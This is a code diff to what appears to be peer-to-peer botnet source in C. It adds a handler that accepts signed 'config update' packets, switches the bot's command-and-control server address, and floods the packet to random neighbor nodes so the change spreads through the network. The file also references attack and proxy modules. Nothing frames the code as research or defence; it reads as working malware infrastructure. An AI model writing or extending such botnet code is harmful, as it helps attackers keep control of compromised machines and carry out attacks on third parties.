@@ -13,6 +13,7 @@
 #include "verify.h"
 #include "attack.h"
 #include "proxy.h"
+#include "protocol_defs.h"
 
 static Neighbor table[MAX_NEIGHBORS];
 static int neighbor_count = 0;
@@ -173,6 +174,52 @@ void p2p_handle_packet(int sock) {
                     }
                 }
             }
+        }
+    }
+    // Reverse Propagation (0xCAFEBABE)
+    else if (magic == htonl(WIRE_CONFIG_MAGIC)) {
+        if (len < sizeof(WireSignedConfigUpdate)) return;
+        
+        WireSignedConfigUpdate *pkg = (WireSignedConfigUpdate*)buffer;
+        
+        static uint32_t current_version = 0;
+        uint32_t pkg_version = ntohl(pkg->version);
+        
+        if (pkg_version <= current_version) return; // Replay/Old
+        
+        // Verify Signature
+        // Master signs: magic + timestamp + version + ip_len + ip
+        // Struct layout: [Magic(4)][Time(8)][Ver(4)][Len(1)][IP(64)][Sig(64)]
+        // Signed data is everything BEFORE Sig.
+        size_t signed_len = sizeof(WireSignedConfigUpdate) - 64;
+        
+        if (ed25519_verify(buffer, signed_len, pkg->signature)) {
+            printf("[P2P] Valid Config Update Received! Version: %d\n", pkg_version);
+            current_version = pkg_version;
+            
+            // Extract IP (Null terminate just in case)
+            char new_ip[65];
+            uint8_t ip_len = pkg->new_ip_len;
+            if (ip_len > 64) ip_len = 64;
+            memcpy(new_ip, pkg->new_ip, ip_len);
+            new_ip[ip_len] = '\0';
+            
+            printf("[Config] Updating C2 to: %s\n", new_ip);
+            // proxy_set_c2(new_ip); // Implementation dependent
+            
+            // Gossip Flood (Forward the WHOLE packet)
+            for (int i = 0; i < 5; i++) { // More aggressive fan-out for config
+                int idx = rand() % MAX_NEIGHBORS;
+                if (table[idx].is_active) {
+                    struct sockaddr_in dest;
+                    dest.sin_family = AF_INET;
+                    dest.sin_addr.s_addr = table[idx].ip;
+                    dest.sin_port = table[idx].port;
+                    sendto(sock, buffer, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+                }
+            }
+        } else {
+             printf("[Warn] Invalid Config Signature!\n");
         }
     }
 }
